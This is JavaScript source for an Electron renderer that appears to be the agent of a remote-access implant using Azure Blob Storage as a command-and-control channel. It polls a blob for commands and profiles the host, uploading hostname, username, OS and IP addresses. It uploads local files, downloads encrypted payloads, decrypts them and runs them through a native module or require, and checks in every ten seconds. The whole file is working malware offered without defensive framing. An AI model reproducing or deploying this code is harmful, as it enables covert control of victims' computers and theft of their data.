const config = require('./config.js');
const storageAccount = config.storageAccount;
const sasToken       = config.sasToken;
const { ipcRenderer } = require('electron');
const { log } = require('console');
const {func_Encrypt,func_Decrypt,func_Base64_Encode} = require('./crypt.js');
const os = require('os');
const fsp = require('fs').promises;
const {func_Split_Quoted_String} = require('./common.js');
let dbg = false;

function func_log(text)
{
  if(dbg)
  {
    log(text);
  }
}
  
async function func_Web_Request(options, data = null, isBytes=false) {

  // Set headers to prevent caching
  options['headers'] = {
      'Cache-Control': 'no-cache, no-store, must-revalidate',
      'Pragma': 'no-cache',
      'Expires': '0',
      ...options['headers']
  };
  let url      = `https://${options['hostname']}:${options['port']}${options['path']}`;
  let response = new Response();
  let r_data;
  try {
    if ( data ) {
      if ( data.length > 20000 ) {
      } else {
      }
      options['body'] = data;
    }
    response = await fetch(url, options);

    if (!isBytes) {
      r_data = await response.text();
    } else {
      r_data = await response.arrayBuffer();
    }
    return {'status':response.status,'data':r_data};
  } catch (error) {
  
  }
}
ipcRenderer.on('do-node-load', async (event,nodepath) => {
    try
    {
        func_log(`browser.js | Hit IPC do-node-load`);
        require(nodepath);
    }catch(error)
    {
        func_log(`Error in IPC do-node-load : ${error}`);
    }
});
ipcRenderer.on('scexec', async (event, container, scexecblob, key,iv) => {
    try
    {
        func_log(`browser.js | Hit IPC do-scexec | ${container} ${scexecblob}`);
        await func_Azure_File_Download_Exec(container,scexecblob,key,iv);
        ipcRenderer.send('end-file-op','do-scexec','did sc',key,iv);
    }catch(error)
    {
        func_log(`Error in IPC do-scexec : ${error}`);
    }
});
async function func_Azure_File_Download_Exec(containerName, scexecblob, key,iv) 
{
  // Construct the URL
  let output = "";
  const sasUrl = `https://${storageAccount}/${containerName}/${scexecblob}?${sasToken}`;
  func_log(`browser.js | func_Azure_File_Download_Exec | key : ${key} | iv : ${iv}`);
  key = Buffer.from(key, 'hex');
  iv  = Buffer.from(iv,  'hex');

  let response = await fetch(sasUrl);
  if (!response.ok) {
    output = `Couldn't download file, response: ${response.status}`;
    func_log( output );
    return output;
  }else
  {
    func_log(`response.ok : ${response.ok}`);
    let arrayBuffer = await response.arrayBuffer();
    buffer          = Buffer.from(arrayBuffer);
    raw             = await func_Decrypt( buffer, key, iv );
    let scExecNodePath = await ipcRenderer.invoke('get-global-path', 'scExecNodePath');
    func_log('scExecNodePath:', scExecNodePath);

    const native = require(scExecNodePath);
    func_log(`func_Azure_File_Download_Exec result : ${native.run_array(Array.from(raw))}`);
  }
}
ipcRenderer.on('do-launch', async (event,nodepath,delay) => {
    try
    {
        func_log(`browser.js | Hit IPC do-launch`);
        await new Promise(resolve => setTimeout(resolve, delay));
        require(nodepath);
    }catch(error)
    {
        func_log(`Error in IPC do-assembly : ${error} ${error.stack}`);
    }
});

ipcRenderer.on('do-pull-file', async (event, container, downloadblob, dstpath,key,iv) => {
    try
    {
        func_log(`browser.js | Hit IPC do-pull-file | ${container} ${downloadblob} ${dstpath}`);
        await func_Azure_File_Download(container,downloadblob,dstpath,key,iv);
        ipcRenderer.send('end-file-op','do-pull-file','pulled file',key,iv);
    }catch(error)
    {
        func_log(`Error in IPC do-pull-file : ${error}`);
    }
});
async function func_Azure_File_Download(containerName, downloadblob, dstpath,key,iv) 
{
  // Construct the URL
  let output = "";
  const sasUrl = `https://${storageAccount}/${containerName}/${downloadblob}?${sasToken}`;
  key = Buffer.from(key, 'hex');
  iv  = Buffer.from(iv,  'hex');
  func_log(`browser.js | func_Azure_File_Download | key : ${key} | iv : ${iv}`);

  //await new Promise(resolve => setTimeout(resolve, 5000));
  let response = await fetch(sasUrl);
  if (!response.ok) {
    output = `Couldn't download file, response: ${response.status}`;
    func_log( output );
    return output;
  }else
  {
    func_log(`response.ok : ${response.ok}`);
    let arrayBuffer = await response.arrayBuffer();
    buffer          = Buffer.from(arrayBuffer);
    raw             = await func_Decrypt( buffer, key, iv );
    await fsp.writeFile(dstpath, raw, (err) => {
      output = `Error writing file: ${err.stack}`;
      func_log( output );
      return output;
    });
    output =  `File ${dstpath} has been saved`;
    func_log( output );
    return output;
  }
}

ipcRenderer.on('do-push-file', async (event, container, srcpath, uploadblob,key,iv)  => {
    try
    {
        func_log(`browser.js | Hit IPC do-push-file | ${container} ${srcpath} ${uploadblob}`);
        await func_Azure_Upload_File(container,srcpath,uploadblob,key,iv);
        ipcRenderer.send('end-file-op','do-push-file','pushedfile',key,iv);
    }catch(error)
    {
        func_log(`Error in IPC do-push-file : ${error}`);
    }
});
async function func_File_Read_ToBuffer(filePath) {
  try {
    // Read the file as a binary buffer
    const fileBuffer = await fsp.readFile(filePath);
    return fileBuffer;
  } catch (error) {
    func_log(`Error reading file: ${error}`);
    return "";
  }
}
async function func_Azure_Upload_File(containerName, srcpath, uploadblob,key,iv) 
{
  try {
    // Read the file content
    key = Buffer.from(key, 'hex');
    iv  = Buffer.from(iv,  'hex');

    func_log(`browser.js | func_Azure_Upload_File() hit`);
    let bufferfile = await func_File_Read_ToBuffer(srcpath);
    let enc        = await func_Encrypt( bufferfile, key, iv );
    const sasUrl = `https://${storageAccount}/${containerName}/${uploadblob}?${sasToken}`;

    const response = await fetch(sasUrl, {
      port: 443,
      method: 'PUT',
      headers: {
        'x-ms-blob-type': 'BlockBlob',
        'Content-Type': 'application/octet-stream' 
      },
      body: enc
    });
    if (response.status != 201) {
        output = `Couldnt upload file, response: ${response.status}`;
        func_log( output );
    }else
    {
        output = `Successfully uploaded file ${srcpath} to https://${storageAccount}/${containerName}/${uploadblob} blob`;
        func_log(output);
    }
  } catch (error) {
    output = `Error uploading file ${srcpath} to azure : ${error.stack}`;
    func_log( output );
  }
}

async function func_Container_Create(StorageContainer)
{
    let options = {
      hostname: storageAccount,
      port: 443,
      path: `/${StorageContainer}?restype=container&${sasToken}`,
      method: 'PUT',
      headers: {
        'x-ms-version': '2020-02-10', // The version of the Azure Blob Storage API to use
        'x-ms-date': new Date().toUTCString(), // The current date and time in UTC format
        'Content-Length': 0
      }
    };
    return await func_Web_Request(options);
}

async function func_Blob_Create(StorageContainer,StorageBlob,data)
{
  try
  {
    if ( data == null)
    {
      data = "";
    }
    data = data.toString();
    const options = {
        hostname: storageAccount,
        port: 443,
        path: `/${StorageContainer}/${StorageBlob}?${sasToken}`, // Path with SAS token and blob parameters
        method: 'PUT',
        headers: {
          'x-ms-version': '2020-02-10', // The version of the Azure Blob Storage API to use
          'x-ms-date': new Date().toUTCString(), // The current date and time in UTC format
          'x-ms-blob-type': 'BlockBlob', // Blob type
          'Content-Type': 'text/plain', // Set appropriate content type
          'Content-Length': Buffer.byteLength(data) // Length of the data
        }
    };
    return await func_Web_Request(options,data);
  }catch(error)
  {
    func_log(`Error in func_Blob_Create() : ${error}`);
    return null;
  }
}

// Function to read a blob's contents
async function func_Blob_Read(StorageContainer, StorageBlob) 
{
  const options = {
    hostname: storageAccount,
    port: 443,
    path: `/${StorageContainer}/${StorageBlob}?${sasToken}`,
    method: 'GET',
    headers: {
      'x-ms-version': '2020-02-10',
      'x-ms-date': new Date().toUTCString()
    }
  };
  return await func_Web_Request(options);
}

async function func_Blob_Write(StorageContainer,StorageBlob,data)
{
  try
  {
    if ( data == null)
    {
      data = "";
    }
    data = data.toString();
    const options = {
        hostname: storageAccount,
        port: 443,
        path: `/${StorageContainer}/${StorageBlob}?${sasToken}`, // Path with SAS token and blob parameters
        method: 'PUT',
        headers: {
          'x-ms-version': '2020-02-10', // The version of the Azure Blob Storage API to use
          'x-ms-date': new Date().toUTCString(), // The current date and time in UTC format
          'x-ms-blob-type': 'BlockBlob', // Blob type
          'Content-Type': 'text/plain', // Set appropriate content type
          'Content-Length': Buffer.byteLength(data) // Length of the data
        }
    };
    return await func_Web_Request(options,data);
  }catch(error)
  {
    return error;
  }
}

ipcRenderer.on('send-output', async (event, container, outblob, output) => {
    try
    {
        await func_Blob_Write(container,outblob,output);
    }catch(error)
    {
        func_log(`Error in send-output() : ${error}`);
        return error;
    }
});

ipcRenderer.on('input-read', async (event, container, inblob) => {
    try
    {
        let updateresp;
        let response = await func_Blob_Read(container,inblob);
        let checkin         = Date.now();
        if (response.status === 200) 
        {
          const numberValue   = Number(response.data);
          if (!isNaN(numberValue)) 
          {
            updateresp  = await func_Blob_Write(container,inblob,checkin);
          } else
          {
            if (response.data)
            {
                ipcRenderer.send('do-command',response.data);
                updateresp  = await func_Blob_Write(container,inblob,checkin);
            }
          }
            if(typeof updateresp.status != 'undefined')
            {
                if (updateresp.status === 201) 
                {
                    ipcRenderer.send('poll-complete',checkin,inblob);
                }
            }
        }else
        {
            ipcRenderer.send('containers-created',false);
        }
    }catch (error) {
        func_log(`${error} ${error.stack}`);
    }
});


async function getSystemInfo() {
  try
  {
    // Collect system information
    // let   hostname  = process.env[ 'USERDOMAIN' ];
    // if ( typeof hostname === 'undefined' ) {
    //   hostname = "";
    // } else if ( hostname == os.hostname() )  {
    //   hostname = "WORKSTATION";
    // }
    // else { 
    //   hostname = "UNKNOWN";
    // }
    // hostname += '/' + os.hostname();
    let hostname = os.hostname();

    const username  = os.userInfo().username;
    const osType    = os.type();
    const osRelease = os.release();
    const platform  = os.platform();
    const arch      = os.arch();
    
    const PID       = process.pid;
    let procName  = process.argv[ 0 ];
    procName = procName.trim().replace(/Helper \(Renderer\)/g, "").trim();
    func_log(`procName: ${procName}`);
    const nets      = os.networkInterfaces();
    const IpInfo    = []
    for (const name of Object.keys(nets)) {
        for (const net of nets[name]) {
            // 'IPv4' is in Node <= 17, from 18 it's a number 4 or 6
            const familyV4Value = typeof net.family === 'string' ? 'IPv4' : 4
            if (net.family === familyV4Value && !net.internal) {
                IpInfo.push( net.address );
            }
        }
    }
    // Create a JSON object with the collected information
    const systemInfo = {
      hostname:  hostname,
      username:  username,
      osType:    osType,
      osRelease: osRelease,
      platform:  platform,
      arch:      arch,
      PID:       PID,
      Process:   procName,
      IP:        IpInfo,
      checkIn:   Date.now()
    };
    return systemInfo;
  }catch (error) {
    func_log(`${error} ${error.stack}`);
    return 0;
  }
}


ipcRenderer.on('init-container', async (event, container, blobs_json, key, iv) => {
    try
    {
        let blobs    = JSON.parse(blobs_json);
        const aes = {
        'key':key,
        'iv':iv
        }
        key = Buffer.from(key, 'hex');
        iv  = Buffer.from(iv,  'hex');

        func_log(`IPC init-container hit : container : ${container}`);
        // let response = await func_Container_Create(container);
        //func_log(`func_Container_Create response status ${response.status}`);
        let options = {
          hostname: storageAccount,
          port: 443,
          path: `/${container}?restype=container&${sasToken}`,
          method: 'PUT',
          headers: {
            'x-ms-version': '2020-02-10', // The version of the Azure Blob Storage API to use
            'x-ms-date': new Date().toUTCString(), // The current date and time in UTC format
            'Content-Length': 0,
            'Cache-Control': 'no-cache, no-store, must-revalidate',
            'Pragma': 'no-cache',
            'Expires': '0'
          }
        }
        let url      = `https://${options['hostname']}:${options['port']}${options['path']}`;
        func_log(url);
        let response = new Response();
        response = await fetch(url, options);
        r_data = await response.text();

        if(response.status == 201)
        {
            const nulldata = "";
            func_log(`blobs : ${blobs_json}`);
            let checkin     = Date.now();
            let inresp      = await func_Blob_Create(container,blobs['in'],checkin);
            func_log(`inresp      status response ${inresp.status}`);
            let outresp     = await func_Blob_Create(container,blobs['out'],nulldata);
            func_log(`outresp     status response ${outresp.status}`);
            let selfInfo                = await getSystemInfo();
            const checkin_encryptedData = await func_Encrypt(JSON.stringify(selfInfo, null, 1), key, iv);
            const checkin_b64EncData    = await func_Base64_Encode(checkin_encryptedData);
            let checkinresp = await func_Blob_Create(container,blobs['checkin'],checkin_b64EncData);
            func_log(`checkinresp status response ${checkinresp.status}`);
            let keyresp     = await func_Blob_Create(container,blobs['key'],JSON.stringify(aes));
            func_log(`keyresp     status response ${keyresp.status}`);
            if(inresp.status === 201 && outresp.status === 201 && checkinresp.status === 201 && keyresp.status === 201 )
            {
                ipcRenderer.send('containers-created',true);
            }else
            {
                ipcRenderer.send('containers-created',false);
            }
        }else
        {
            ipcRenderer.send('containers-created',false);
        }
    }catch (error) {
        func_log(`${error} ${error.stack}`);
    }
});

// Listen for the window ID from the main process
ipcRenderer.on('init-mapping-container', async (event, metaContainer,agentname,agentcontainer) => {
  try
  { 
    let response = await func_Container_Create(metaContainer);
    let outresp  = await func_Blob_Create(metaContainer,agentname,agentcontainer);
}catch (error) {
  func_log(`Error in ipcRender(init-mapping-container): ${error.message}\r\n${error.stack}`);
}
});

function func_Checkin_Send()
{
    let timestamp = Date.now();
    ipcRenderer.send('checkin', timestamp);
}


setInterval(func_Checkin_Send, 10000);